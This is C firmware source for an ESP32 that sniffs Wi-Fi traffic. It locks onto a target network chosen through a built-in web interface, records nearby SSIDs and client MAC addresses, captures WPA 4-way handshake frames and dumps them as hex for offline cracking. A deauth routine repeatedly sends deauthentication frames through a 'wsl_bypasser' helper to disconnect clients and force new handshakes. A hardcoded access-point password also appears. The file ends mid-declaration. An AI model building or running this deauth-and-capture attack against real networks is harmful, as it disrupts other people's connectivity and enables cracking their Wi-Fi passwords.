// main.c — ESP-IDF Wi‑Fi promiscuous sniffer (builds wifi_ap_record_t from Beacons only, no scan)
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_netif.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include "esp_http_server.h"
#include <stdarg.h>
#include "driver/gpio.h"
#include "esp_random.h"
#include "wsl_bypasser.h"
#include "esp_heap_caps.h"

// WebServer Ip: http://192.168.4.1 (connect to wifi, then Webserver)

static const char *TAG = "wifi_sniffer";
static char g_target_ssid[33] = "";
static httpd_handle_t server = NULL;
static TaskHandle_t s_chan_hop_handle = NULL;
static volatile bool hopper = true;

#define HS_TIMEOUT_MS 5000  // Clear partial lanes after 5 seconds


static volatile bool g_ap_running = false;          // set true once APSTA is started
static volatile uint8_t g_desired_ap_channel = 1;   // where we want AP/PHY to be

// ===== Target AP info (filled from Beacon, no active scan) ==================
static wifi_ap_record_t g_target_ap_record;
static volatile bool g_target_ap_record_valid = false;
static uint8_t g_locked_bssid[6] = {0};
static volatile bool g_have_locked_bssid = false;
static volatile int8_t g_last_rssi = 0;

// ==== Locking / channel state ==============================================
static volatile bool g_sniffer_active = false;
static volatile bool g_channel_locked = false;
static volatile uint8_t g_locked_channel = 1;
static volatile uint8_t g_current_channel = 1;
static volatile TickType_t g_last_frame_tick = 0;
#define LOCK_IDLE_MS 15000

#define BOOT_BUTTON_GPIO 0  // ESP32-S3 BOOT

#define MAX_SSIDS 32
static char g_scanned_ssids[MAX_SSIDS][33];
static uint8_t g_scanned_channels[MAX_SSIDS];
static int8_t g_scanned_rssi[MAX_SSIDS];
static int g_ssid_count = 0;
static uint8_t g_ap_bssids[MAX_SSIDS][6];

// ==== Handshake capture =====================================================
typedef struct {
    uint8_t *m1; size_t m1_len;
    uint8_t *m2; size_t m2_len;
    uint8_t *m3; size_t m3_len;
    uint8_t *m4; size_t m4_len;
    uint8_t bssid[6];
    uint8_t ap[6];
    uint8_t sta[6];
    bool have_ap_sta;
    uint8_t *beacon; size_t beacon_len;
    bool active;
    bool complete;
    // --- RC matching + timeouts ---
    uint64_t rc12; bool have_rc12;
    uint64_t rc34; bool have_rc34;
    TickType_t lane12_start;
    TickType_t lane34_start;
} hs_entry_t;


#define MAX_HS 16
static hs_entry_t handshakes[MAX_HS];
static int hs_count = 0;

static char web_output[256] = "";

static void web_set_outputf(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt); vsnprintf(web_output, sizeof(web_output), fmt, ap); va_end(ap);
}

static void mac_to_str(const uint8_t mac[6], char *out, size_t outlen) {
    snprintf(out, outlen, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// Safely apply a channel to both the radio and the SoftAP config (if running).
static void apply_ap_channel(uint8_t ch) {
    // Update SoftAP config if available
    wifi_config_t cfg;
    if (esp_wifi_get_config(WIFI_IF_AP, &cfg) == ESP_OK) {
        if (cfg.ap.channel != ch) {
            cfg.ap.channel = ch;
            ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &cfg));
        }
    }

    // Apply to the radio (primary channel). Works in APSTA, too.
    esp_err_t err = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set channel %u (err=%d): client connected?", ch, err);
    } else {
        g_current_channel = ch;
        ESP_LOGI(TAG, "Applied AP/PHY channel -> %u", ch);
    }
    g_current_channel = ch;
    ESP_LOGI(TAG, "Applied AP/PHY channel -> %u", ch);
}


// ==== utils ================================================================
static inline bool mac_eq(const uint8_t a[6], const uint8_t b[6]) { return memcmp(a,b,6)==0; }
static inline bool mac_is_zero(const uint8_t a[6]) { static const uint8_t z[6] = {0}; return mac_eq(a,z); }
static inline void mac_copy(uint8_t dst[6], const uint8_t src[6]) { memcpy(dst,src,6); }

static hs_entry_t* get_active_handshake() {
    for (int i = 0; i < MAX_HS; i++) {
        if (handshakes[i].active) {
            if (handshakes[i].complete) { handshakes[i].active = false; continue; }
            return &handshakes[i];
        }
    }
    for (int i = 0; i < MAX_HS; i++) {
        if (hs_count < MAX_HS && !handshakes[i].complete && !handshakes[i].active) {
            handshakes[i] = (hs_entry_t){0};
            handshakes[i].active = true;
            hs_count++;
            return &handshakes[i];
        }
    }
    return NULL;
}

// Core: write hex bytes with spaces into dst (NUL-terminated). Returns chars written.
static size_t hex_to_buf_spaces(char *dst, size_t cap, const uint8_t *src, size_t n) {
    static const char HEX[] = "0123456789ABCDEF";
    size_t out = 0;
    if (!dst || !cap || !src) return 0;

    for (size_t i = 0; i < n; ++i) {
        if (out + 2 >= cap) break;
        uint8_t b = src[i];
        dst[out++] = HEX[b >> 4];
        dst[out++] = HEX[b & 0x0F];
        if (i + 1 < n) { if (out + 1 >= cap) break; dst[out++] = ' '; }
    }
    if (out < cap) dst[out] = '\0';
    return out;
}

// Keep your existing console helper, now built on the buffer version:
void print_hex_only(const uint8_t *data, size_t len) {
    // Print in chunks so we don't need giant stack buffers
    char chunk[256];
    size_t i = 0;
    while (i < len) {
        size_t take = len - i;
        if (take > (sizeof(chunk) - 1) / 3) take = (sizeof(chunk) - 1) / 3; // "FF " per byte
        hex_to_buf_spaces(chunk, sizeof(chunk), data + i, take);
        printf("%s", chunk);
        if ((i += take) < len) printf(" ");
    }
    printf("\n\n");
}

static void log_handshake(const hs_entry_t *hs) {
    if (hs->m1) { printf("--- M1 ---\n"); print_hex_only(hs->m1, hs->m1_len); }
    if (hs->m2) { printf("--- M2 ---\n"); print_hex_only(hs->m2, hs->m2_len); }
    if (hs->m3) { printf("--- M3 ---\n"); print_hex_only(hs->m3, hs->m3_len); }
    if (hs->m4) { printf("--- M4 ---\n"); print_hex_only(hs->m4, hs->m4_len); }
    if (hs->beacon) { printf("--- BEACON ---\n"); print_hex_only(hs->beacon, hs->beacon_len); }
}

static void save_frame_buf(uint8_t **dst, size_t *dst_len, const uint8_t *src, size_t len) {
    if (!src || len == 0) return;
    free(*dst);
    *dst = (uint8_t*)malloc(len);
    if (*dst) { memcpy(*dst, src, len); *dst_len = len; } else { *dst_len = 0; }
}

// 802.11 header length helper
static int dot11_header_len(const uint8_t *p, uint16_t len) {
    if (len < 24) return -1;
    uint8_t fc0 = p[0], fc1 = p[1];
    uint8_t type = (fc0 >> 2) & 0x3;
    uint8_t subtype = (fc0 >> 4) & 0xF;
    bool to_ds   = (fc1 & 0x01) != 0;
    bool from_ds = (fc1 & 0x02) != 0;
    bool order   = (fc1 & 0x80) != 0;

    int hdr = 24;
    if (type == 2) {
        bool qos = (subtype & 0x08) != 0;
        if (to_ds && from_ds) hdr += 6;
        if (qos) hdr += 2;
        if (order) hdr += 4;
    } else if (type == 0) {
        if (order) hdr += 4;
    }
    if (hdr > len) return -1;
    return hdr;
}

// Parse the big‑endian 8‑byte Replay Counter from an EAPOL‑Key frame
static bool parse_eapol_replay_counter(const uint8_t *payload, uint16_t len, uint64_t *out_rc) {
    int hdr = dot11_header_len(payload, len);
    if (hdr < 0 || (uint16_t)hdr + 8 > len) return false;
    const uint8_t *llc = payload + hdr;
    if (!(llc[0]==0xAA && llc[1]==0xAA && llc[2]==0x03 && llc[3]==0x00 && llc[4]==0x00 && llc[5]==0x00 && llc[6]==0x88 && llc[7]==0x8E))
        return false;
    const uint8_t *eapol = llc + 8;
    if (eapol[1] != 0x03) return false;
    uint16_t eapol_len = ((uint16_t)eapol[2] << 8) | eapol[3];
    if (eapol_len < 95 || eapol + 4 + eapol_len > payload + len) return false;

    const uint8_t *key = eapol + 4;
    uint64_t rc = 0;
    for (int i = 0; i < 8; ++i) rc = (rc << 8) | key[5 + i];
    *out_rc = rc;
    return true;
}

// Free M1/M2, reset RC12 and timer
static void clear_lane_12(hs_entry_t *hs) {
    if (hs->m1) { free(hs->m1); hs->m1 = NULL; hs->m1_len = 0; }
    if (hs->m2) { free(hs->m2); hs->m2 = NULL; hs->m2_len = 0; }
    hs->have_rc12 = false; hs->rc12 = 0; hs->lane12_start = 0;
}

// Free M3/M4, reset RC34 and timer
static void clear_lane_34(hs_entry_t *hs) {
    if (hs->m3) { free(hs->m3); hs->m3 = NULL; hs->m3_len = 0; }
    if (hs->m4) { free(hs->m4); hs->m4 = NULL; hs->m4_len = 0; }
    hs->have_rc34 = false; hs->rc34 = 0; hs->lane34_start = 0;
}

// Remove stale lanes on all active handshakes
static void handshake_housekeeping(void) {
    TickType_t now = xTaskGetTickCount();
    for (int i = 0; i < MAX_HS; ++i) {
        hs_entry_t *hs = &handshakes[i];
        if (!hs->active || hs->complete) continue;

        if (hs->have_rc12 && hs->lane12_start &&
            (now - hs->lane12_start) > pdMS_TO_TICKS(HS_TIMEOUT_MS)) {
            clear_lane_12(hs);
        }
        if (hs->have_rc34 && hs->lane34_start &&
            (now - hs->lane34_start) > pdMS_TO_TICKS(HS_TIMEOUT_MS)) {
            clear_lane_34(hs);
        }
    }
}

// Find or create a slot for (AP, STA, BSSID, RC, lane12?). Lane12 means M1/M2.
static hs_entry_t* get_slot_for_pair_and_rc(const uint8_t ap[6], const uint8_t sta[6],
                                            const uint8_t bssid[6], uint64_t rc, bool lane12) {
    // Search for an existing active slot matching pair/bssid and lane RC (if present)
    for (int i = 0; i < MAX_HS; ++i) {
        hs_entry_t *hs = &handshakes[i];
        if (!hs->active || hs->complete) continue;

        bool pair_ok = (hs->have_ap_sta && mac_eq(hs->ap, ap) && mac_eq(hs->sta, sta)) ||
                       !hs->have_ap_sta;
        if (!pair_ok) continue;

        bool bssid_ok = mac_is_zero(hs->bssid) || mac_eq(hs->bssid, bssid);
        if (!bssid_ok) continue;

        if (lane12) {
            if (!hs->have_rc12 || hs->rc12 == rc) {
                if (!hs->have_ap_sta) { mac_copy(hs->ap, ap); mac_copy(hs->sta, sta); hs->have_ap_sta = true; }
                if (mac_is_zero(hs->bssid)) mac_copy(hs->bssid, bssid);
                return hs;
            }
        } else {
            if (!hs->have_rc34 || hs->rc34 == rc) {
                if (!hs->have_ap_sta) { mac_copy(hs->ap, ap); mac_copy(hs->sta, sta); hs->have_ap_sta = true; }
                if (mac_is_zero(hs->bssid)) mac_copy(hs->bssid, bssid);
                return hs;
            }
        }
    }

    // Allocate a fresh slot
    for (int i = 0; i < MAX_HS; ++i) {
        hs_entry_t *hs = &handshakes[i];
        if (!hs->active && !hs->complete) {
            *hs = (hs_entry_t){0};
            hs->active = true;
            mac_copy(hs->ap, ap);
            mac_copy(hs->sta, sta);
            hs->have_ap_sta = true;
            mac_copy(hs->bssid, bssid);
            return hs;
        }
    }
    // Reuse an empty lane if needed
    for (int i = 0; i < MAX_HS; ++i) {
        hs_entry_t *hs = &handshakes[i];
        if (hs->active && !hs->complete && !hs->have_rc12 && !hs->have_rc34) {
            *hs = (hs_entry_t){0};
            hs->active = true;
            mac_copy(hs->ap, ap);
            mac_copy(hs->sta, sta);
            hs->have_ap_sta = true;
            mac_copy(hs->bssid, bssid);
            return hs;
        }
    }
    return NULL;
}


// Extract SSID & BSSID from a Beacon (type=0, subtype=8). Returns true if found
static bool extract_beacon_info(const uint8_t *payload, uint16_t len, char ssid_out[33], uint8_t bssid_out[6]) {
    if (len < 36) return false;
    uint8_t fc0 = payload[0];
    uint8_t type = (fc0 >> 2) & 0x3;
    uint8_t subtype = (fc0 >> 4) & 0xF;
    if (!(type == 0 && subtype == 8)) return false; // not a beacon

    memcpy(bssid_out, payload + 16, 6); // BSSID is addr3

    const uint8_t *tags = payload + 36; // IEs after fixed 12 bytes
    size_t tlen = len - 36;
    while (tlen >= 2) {
        uint8_t id = tags[0];
        uint8_t l  = tags[1];
        if (2 + l > tlen) break;
        if (id == 0) { // SSID element
            size_t n = l; if (n > 32) n = 32;
            memcpy(ssid_out, tags + 2, n);
            ssid_out[n] = '\0';
            return true;
        }
        tags += 2 + l; tlen -= 2 + l;
    }
    return false;
}

// Classify EAPOL 4-way messages
#define EAPOL_KEY_INFO_TYPE_PTK   0x0008u
#define EAPOL_KEY_INFO_INSTALL    0x0040u
#define EAPOL_KEY_INFO_KEY_ACK    0x0080u
#define EAPOL_KEY_INFO_KEY_MIC    0x0100u
#define EAPOL_KEY_INFO_SECURE     0x0200u

static int classify_eapol(const uint8_t *payload, uint16_t len) {
    int hdr = dot11_header_len(payload, len);
    if (hdr < 0 || (uint16_t)hdr + 8 > len) return 0;

    const uint8_t *llc = payload + hdr;
    if (!(llc[0]==0xAA && llc[1]==0xAA && llc[2]==0x03 && llc[3]==0x00 && llc[4]==0x00 && llc[5]==0x00 && llc[6]==0x88 && llc[7]==0x8E)) return 0;

    const uint8_t *eapol = llc + 8;
    if (eapol[1] != 0x03) return 0; // only Key frames
    uint16_t eapol_len = ((uint16_t)eapol[2] << 8) | eapol[3];
    if (eapol_len < 95 || eapol + 4 + eapol_len > payload + len) return 0;

    const uint8_t *key = eapol + 4;
    uint16_t key_info = ((uint16_t)key[1] << 8) | key[2];
    if ((key_info & EAPOL_KEY_INFO_TYPE_PTK) == 0) return 0;

    bool ack     = (key_info & EAPOL_KEY_INFO_KEY_ACK) != 0;
    bool install = (key_info & EAPOL_KEY_INFO_INSTALL) != 0;
    bool secure  = (key_info & EAPOL_KEY_INFO_SECURE) != 0;

    if (ack) return install ? 3 : 1; // M3 or M1
    return secure ? 4 : 2;           // M4 or M2
}

// Derive AP/STA/BSSID from DATA frame via DS bits
static bool derive_pair_from_data(const uint8_t *payload, uint16_t len,
                                  uint8_t out_ap[6], uint8_t out_sta[6], uint8_t out_bssid[6]) {
    if (len < 24) return false;
    uint8_t fc0 = payload[0], fc1 = payload[1];
    uint8_t type = (fc0 >> 2) & 0x3; if (type != 2) return false;
    bool to_ds   = (fc1 & 0x01) != 0;
    bool from_ds = (fc1 & 0x02) != 0;
    if (to_ds && from_ds) return false; // 4-address not handled

    const uint8_t *a1 = payload + 4;   // RA/DA
    const uint8_t *a2 = payload + 10;  // TA/SA
    const uint8_t *a3 = payload + 16;  // BSSID/DA/SA (depends)

    if (!to_ds && from_ds) {          // AP -> STA
        mac_copy(out_bssid, a2); mac_copy(out_ap, a2); mac_copy(out_sta, a1); return true;
    } else if (to_ds && !from_ds) {   // STA -> AP
        mac_copy(out_bssid, a1); mac_copy(out_ap, a1); mac_copy(out_sta, a2); return true;
    } else {                          // ad-hoc like (rare for 4-way)
        mac_copy(out_bssid, a3);
        if (!mac_eq(a1, a3)) { mac_copy(out_sta, a1); mac_copy(out_ap, a2); }
        else { mac_copy(out_sta, a2); mac_copy(out_ap, a1); }
        return true;
    }
}

// Parse RSN/WPA IEs in Beacon to guess wifi_auth_mode_t (no active scan)
static wifi_auth_mode_t auth_from_beacon(const uint8_t *payload, uint16_t len) {
    if (len < 36) return WIFI_AUTH_OPEN;
    // Capability (for WEP detection)
    uint16_t capab = payload[34] | ((uint16_t)payload[35] << 8);

    const uint8_t *tags = payload + 36;
    size_t tlen = len - 36;

    bool has_rsn = false, has_wpa = false, has_psk_rsn = false, has_sae = false, has_owe = false;

    while (tlen >= 2) {
        uint8_t id = tags[0], l = tags[1];
        if (2 + l > tlen) break;
        const uint8_t *v = tags + 2;

        if (id == 48 && l >= 2) { // RSN
            has_rsn = true;
            size_t i = 0;
            if (l < 2 + 4) goto next;                   // ver + group cipher
            i += 2 + 4;
            if (l < i + 2) goto next;                   // pairwise count
            uint16_t pc = v[i] | (v[i+1] << 8); i += 2;
            if (l < i + 4 * pc) goto next;              // pairwise list
            i += 4 * pc;
            if (l < i + 2) goto next;                   // AKM count
            uint16_t akmc = v[i] | (v[i+1] << 8); i += 2;
            for (uint16_t k = 0; k < akmc && l >= i + 4; k++, i += 4) {
                if (v[i]==0x00 && v[i+1]==0x0f && v[i+2]==0xac) {
                    uint8_t t = v[i+3];
                    if (t == 2 || t == 4) has_psk_rsn = true;   // PSK / FT-PSK
                    if (t == 8 || t == 9) has_sae = true;       // SAE / FT-SAE
                    if (t == 18)           has_owe = true;      // OWE
                }
            }
        } else if (id == 221 && l >= 4 && v[0]==0x00 && v[1]==0x50 && v[2]==0xF2 && v[3]==0x01) {
            has_wpa = true; // WPA (vendor IE)
        }
    next:
        tags += 2 + l; tlen -= 2 + l;
    }

    if (has_owe) return WIFI_AUTH_OWE;
    if (has_sae && has_psk_rsn) return WIFI_AUTH_WPA2_WPA3_PSK;
    if (has_sae) return WIFI_AUTH_WPA3_PSK;
    if (has_psk_rsn && has_wpa) return WIFI_AUTH_WPA_WPA2_PSK;
    if (has_psk_rsn) return WIFI_AUTH_WPA2_PSK;
    if (has_wpa) return WIFI_AUTH_WPA_PSK;

    if ((capab & 0x0010) && !has_rsn && !has_wpa) return WIFI_AUTH_WEP; // privacy bit
    return WIFI_AUTH_OPEN;
}

// ==== Handshake frame capture ==============================================
static uint8_t clients_r[50][6];
static uint8_t clients_s[50][6];
static uint8_t clients[50][6];
static int client_count = 0;

static void capture_handshake_frame(const uint8_t *payload, uint16_t len, int rssi) {
    (void)rssi;

    // Periodically clear stale lanes
    handshake_housekeeping();

    int mtype = classify_eapol(payload, len);
    if (!mtype) return;

    uint8_t ap[6], sta[6], bssid[6];
    if (!derive_pair_from_data(payload, len, ap, sta, bssid)) return;

    if (g_have_locked_bssid && !mac_eq(bssid, g_locked_bssid)) return;

    // Extract the replay counter (big-endian, 8 bytes)
    uint64_t rc = 0;
    if (!parse_eapol_replay_counter(payload, len, &rc)) return;

    // M1/M2 share lane12; M3/M4 share lane34
    bool lane12 = (mtype == 1 || mtype == 2);
    hs_entry_t *hs = get_slot_for_pair_and_rc(ap, sta, bssid, rc, lane12);
    if (!hs) return;

    // Ensure fixed pair and bssid
    if (!mac_is_zero(hs->bssid) && !mac_eq(hs->bssid, bssid)) return;
    if (!hs->have_ap_sta) { mac_copy(hs->ap, ap); mac_copy(hs->sta, sta); hs->have_ap_sta = true; }
    if (!mac_eq(hs->ap, ap) || !mac_eq(hs->sta, sta)) return;
    if (mac_is_zero(hs->bssid)) mac_copy(hs->bssid, bssid);

    TickType_t now = xTaskGetTickCount();
    // Handle lane RC and timeouts
    if (lane12) {
        if (!hs->have_rc12) {
            hs->rc12 = rc; hs->have_rc12 = true; hs->lane12_start = now;
        } else if (hs->rc12 != rc) {
            clear_lane_12(hs);
            hs->rc12 = rc; hs->have_rc12 = true; hs->lane12_start = now;
        }
    } else {
        if (!hs->have_rc34) {
            hs->rc34 = rc; hs->have_rc34 = true; hs->lane34_start = now;
        } else if (hs->rc34 != rc) {
            clear_lane_34(hs);
            hs->rc34 = rc; hs->have_rc34 = true; hs->lane34_start = now;
        }
    }

    // Store the frame in its slot
    switch (mtype) {
        case 1: save_frame_buf(&hs->m1,&hs->m1_len,payload,len); break;
        case 2: save_frame_buf(&hs->m2,&hs->m2_len,payload,len); break;
        case 3: save_frame_buf(&hs->m3,&hs->m3_len,payload,len); break;
        case 4: save_frame_buf(&hs->m4,&hs->m4_len,payload,len); break;
        default: return;
    }

    // Completion criteria: any valid pair of two frames as you defined
    bool complete =
        (hs->m1 && hs->m2) ||
        (hs->m2 && hs->m3) ||
        (hs->m1 && hs->m4) ||
        (hs->m3 && hs->m4);

    if (complete) {
        log_handshake(hs);
        hs->complete = true;
        // Optional: stop housekeeping from clearing a completed one
        hs->lane12_start = hs->lane34_start = 0;
    }
}


// ==== Promiscuous callback =================================================
static void sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t pkt_type) {
    const wifi_promiscuous_pkt_t *ppkt = (const wifi_promiscuous_pkt_t *)buf;
    const wifi_pkt_rx_ctrl_t *rx = &ppkt->rx_ctrl;
    const uint8_t *payload = ppkt->payload;
    uint16_t len = rx->sig_len;
    g_last_frame_tick = xTaskGetTickCount();

    do {
        if (pkt_type != WIFI_PKT_MGMT || len < 26) break;
        const uint8_t *p = payload;
        uint8_t fc0 = p[0];
        if ( ((fc0 >> 2) & 0x3) != 0 /* mgmt */ || ((fc0 >> 4) & 0xF) != 12 ) break;
        const uint8_t *da = p + 4, *sa = p + 10, *bssid = p + 16;
        uint16_t reason = (uint16_t)p[24] | ((uint16_t)p[25] << 8);
        ESP_LOGW(TAG,
            "DEAUTH sa=%02X:%02X:%02X:%02X:%02X:%02X -> da=%02X:%02X:%02X:%02X:%02X:%02X "
            "bssid=%02X:%02X:%02X:%02X:%02X:%02X ch=%u rssi=%d reason=%u",
            sa[0],sa[1],sa[2],sa[3],sa[4],sa[5],
            da[0],da[1],da[2],da[3],da[4],da[5],
            bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
            rx->channel, rx->rssi, reason);
    } while (0);

    if (pkt_type == WIFI_PKT_MGMT) {
    char ssid_tmp[33] = {0};
    uint8_t bssid_tmp[6] = {0};

    if (extract_beacon_info(payload, len, ssid_tmp, bssid_tmp)) {
    if (strcmp(ssid_tmp, g_target_ssid) == 0) {
        // We saw a beacon for the target SSID
        // 1) Always refresh the AP record + BSSID for the UI
        wifi_ap_record_t rec = (wifi_ap_record_t){0};
        memcpy(rec.bssid, bssid_tmp, 6);
        snprintf((char*)rec.ssid, sizeof(rec.ssid), "%s", ssid_tmp);
        rec.primary  = rx->channel;
        rec.rssi     = rx->rssi;
        rec.authmode = auth_from_beacon(payload, len);
        g_target_ap_record = rec;
        g_target_ap_record_valid = true;

        memcpy(g_locked_bssid, bssid_tmp, 6);
        g_have_locked_bssid = true;
        g_last_rssi = rx->rssi;

        // 2) Lock channel on first sight only
        if (!g_channel_locked) {
            g_locked_channel = rx->channel;
            g_channel_locked = true;
            g_desired_ap_channel = g_locked_channel;
            if (g_ap_running) {
                apply_ap_channel(g_desired_ap_channel);
            }
            ESP_LOGI(TAG,
                "Locking to channel %u due to target beacon (SSID='%s' BSSID=%02X:%02X:%02X:%02X:%02X:%02X)",
                g_locked_channel, ssid_tmp,
                bssid_tmp[0], bssid_tmp[1], bssid_tmp[2], bssid_tmp[3], bssid_tmp[4], bssid_tmp[5]);
        }

        // Find a slot that already matches this BSSID, or make one
        hs_entry_t *slot = NULL;
        for (int i = 0; i < MAX_HS; ++i) {
            if (handshakes[i].active && !handshakes[i].complete &&
                (mac_is_zero(handshakes[i].bssid) || mac_eq(handshakes[i].bssid, bssid_tmp))) {
                slot = &handshakes[i];
                break;
            }
        }
        if (!slot) {
            for (int i = 0; i < MAX_HS; ++i) {
                if (!handshakes[i].active && !handshakes[i].complete) {
                    handshakes[i] = (hs_entry_t){0};
                    handshakes[i].active = true;
                    slot = &handshakes[i];
                    break;
                }
            }
        }
        if (slot && !slot->beacon) {
            save_frame_buf(&slot->beacon, &slot->beacon_len, payload, len);
            mac_copy(slot->bssid, bssid_tmp);
        }

    }
    bool found = false;
    for (int i = 0; i < g_ssid_count; i++) {
        if (strcmp(g_scanned_ssids[i], ssid_tmp) == 0) {
            g_scanned_rssi[i] = rx->rssi;
            found = true;
            break;
        }
    }
    if (!found && g_ssid_count < MAX_SSIDS) {
        strcpy(g_scanned_ssids[g_ssid_count], ssid_tmp);
        g_scanned_channels[g_ssid_count] = rx->channel;
        memcpy(g_ap_bssids[g_ssid_count], bssid_tmp, 6);
        g_scanned_rssi[g_ssid_count] = rx->rssi;
        g_ssid_count++;
        ESP_LOGI(TAG, "Scanned SSID #%d: '%s' CH%d RSSI%d", 
                 g_ssid_count, ssid_tmp, rx->channel, rx->rssi);
    }
}
}

    if (pkt_type == WIFI_PKT_DATA) {
        capture_handshake_frame(payload,len, rx->rssi);
    }
    if (pkt_type == WIFI_PKT_DATA || pkt_type == WIFI_PKT_MGMT) {
        hs_entry_t *p = get_active_handshake();
        if (!p) return;
        if (len >= 24) {
            const uint8_t *addr1 = payload + 4;   // Receiver MAC
            const uint8_t *addr2 = payload + 10;  // Sender MAC
            for (int i = 0; i < 25; i++) {
                if (memcmp(clients[i], addr1, 6) == 0) return;
                if (memcmp(clients[i], addr2, 6) == 0) return;
            }
            if (!mac_is_zero(p->bssid) && memcmp(addr1, p->bssid, 6) == 0 && memcmp(addr2, "\xff\xff\xff\xff\xff\xff", 6) != 0) {
                for (int i = 0; i < 50; i++) {
                    if (memcmp(clients_r[i], addr2, 6) == 0){
                        ESP_LOGI(TAG, "2.4GHz Client: %02x:%02x:%02x:%02x:%02x:%02x", addr2[0], addr2[1], addr2[2], addr2[3], addr2[4], addr2[5]);
                        if (client_count < 50) { memcpy(clients[client_count], addr2, 6); client_count++; }
                        return;
                    }
                }
                for (int i = 0; i < 50; i++) {
                    if (memcmp(clients_s[i], addr2, 6) == 0) return;
                    if (clients_s[i][0] == 0){ memcpy(clients_s[i], addr2, 6); return; }
                }
            }
            if (!mac_is_zero(p->bssid) && memcmp(addr2, p->bssid, 6) == 0 && memcmp(addr1, "\xff\xff\xff\xff\xff\xff", 6) != 0) {
                for (int i = 0; i < 50; i++) {
                    if (memcmp(clients_s[i], addr1, 6) == 0){ if (client_count < 50) { memcpy(clients[client_count], addr1, 6); client_count++; } return; }
                }
                for (int i = 0; i < 50; i++) {
                    if (memcmp(clients_r[i], addr1, 6) == 0) return;
                    if (clients_r[i][0] == 0){ memcpy(clients_r[i], addr1, 6); return; }
                }
            }
        }
    }
}

static esp_err_t api_set_target_ssid_handler(httpd_req_t *req) {
    char query[128] = {0}, ssid[33] = {0};
    if (httpd_req_get_url_query_len(req) > 0 && 
        httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        httpd_query_key_value(query, "ssid", ssid, sizeof(ssid));
    }
    
    // Update global target
    strncpy(g_target_ssid, ssid[0] ? ssid : "", sizeof(g_target_ssid)-1);
    g_target_ssid[sizeof(g_target_ssid)-1] = 0;
    
    // Reset lock state when changing target
    g_channel_locked = false;
    g_have_locked_bssid = false;
    g_target_ap_record_valid = false;
    memset(g_locked_bssid, 0, 6);

    hopper = true;
    
    web_set_outputf("Target SSID set: '%s' (unlocked)", g_target_ssid);
    
    httpd_resp_set_type(req, "application/json");
    char resp[128];
    snprintf(resp, sizeof(resp), "{\"ok\":true,\"ssid\":\"%s\"}", g_target_ssid);
    return httpd_resp_send(req, resp, strlen(resp));
}

static esp_err_t api_ssid_list_handler(httpd_req_t *req) {
    char json[2048] = "[";
    int first = 1;
    for (int i = 0; i < g_ssid_count; i++) {
        if (!first) strcat(json, ",");
        char bssid[18]; mac_to_str(g_ap_bssids[i], bssid, 18);
        char entry[128];
        snprintf(entry, sizeof(entry), "{\"ssid\":\"%s\",\"ch\":%d,\"rssi\":%d,\"bssid\":\"%s\"}", 
                 g_scanned_ssids[i], g_scanned_channels[i], g_scanned_rssi[i], bssid);
        strcat(json, entry);
        first = 0;
    }
    strcat(json, "]");
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, json, strlen(json));
}

static void channel_hopper(void *arg);

static void toggle_wifi_mode(bool ap_mode) {
    (void)ap_mode;
    static bool started = false;
    static esp_netif_t *s_ap_netif = NULL;
    static esp_netif_t *s_sta_netif = NULL;
    if (started) return;

    if (!s_ap_netif)  s_ap_netif  = esp_netif_create_default_wifi_ap();
    if (!s_sta_netif) s_sta_netif = esp_netif_create_default_wifi_sta();

    // If we already discovered a target, prefer its channel; else default to 1
    uint8_t boot_ch = (g_channel_locked && g_locked_channel >= 1 && g_locked_channel <= 13)
                      ? g_locked_channel : g_desired_ap_channel;
    if (boot_ch < 1 || boot_ch > 13) boot_ch = 1;
    g_desired_ap_channel = boot_ch;

    wifi_config_t ap_cfg = {
        .ap = {
            .ssid = "MGMT-AP",
            .ssid_len = 7,
            .channel = boot_ch,             // <<< start SoftAP on the desired channel
            .password = "datapowercable",
            .max_connection = 4,
            .authmode = WIFI_AUTH_WPA2_PSK,
            .pmf_cfg = { .required = false },
        }
    };

    httpd_uri_t set_ssid_uri = {
    .uri       = "/api/set_target_ssid",
    .method    = HTTP_POST,
    .handler   = api_set_target_ssid_handler,
    .user_ctx  = NULL
    };
    httpd_register_uri_handler(server, &set_ssid_uri);

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_cfg));
    ESP_ERROR_CHECK(esp_wifi_start());
    g_ap_running = true;  // <<< mark AP as running
    ESP_LOGI(TAG, "SoftAP (APSTA) started: SSID=MGMT-AP, CH=%d", ap_cfg.ap.channel);

    // Ensure radio is actually on that channel initially
    apply_ap_channel(boot_ch);

    wifi_promiscuous_filter_t filter = {0};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                         WIFI_PROMIS_FILTER_MASK_CTRL |
                         WIFI_PROMIS_FILTER_MASK_DATA;
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(&sniffer_cb));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    hopper = true;
    extern volatile bool g_sniffer_active;
    g_sniffer_active = true;
    xTaskCreatePinnedToCore(channel_hopper, "chan_hop", 4096, NULL, 5, &s_chan_hop_handle, 0);

    started = true;
}


static void deauth_all_clients(const uint8_t bssid[6], uint8_t reason) {
    (void)bssid; (void)reason;
    for (int i = 0; i < 5; i++) {
        wsl_bypasser_send_deauth_frame(g_target_ap_record_valid ? &g_target_ap_record : NULL);
    }
    ESP_LOGW(TAG, "Deauth frames sent to all clients of target AP");
}

// Helpers
static int count_captured_hs(void) {
    int n = 0;
    for (int i = 0; i < MAX_HS; ++i) {
        if (handshakes[i].complete) ++n; // match what api_state_handler renders
    }
    return n;
}

// --- UI: GET / -> simple 2-col table with live updates ---
static esp_err_t root_get_handler(httpd_req_t *req) {
    static const char page[] =
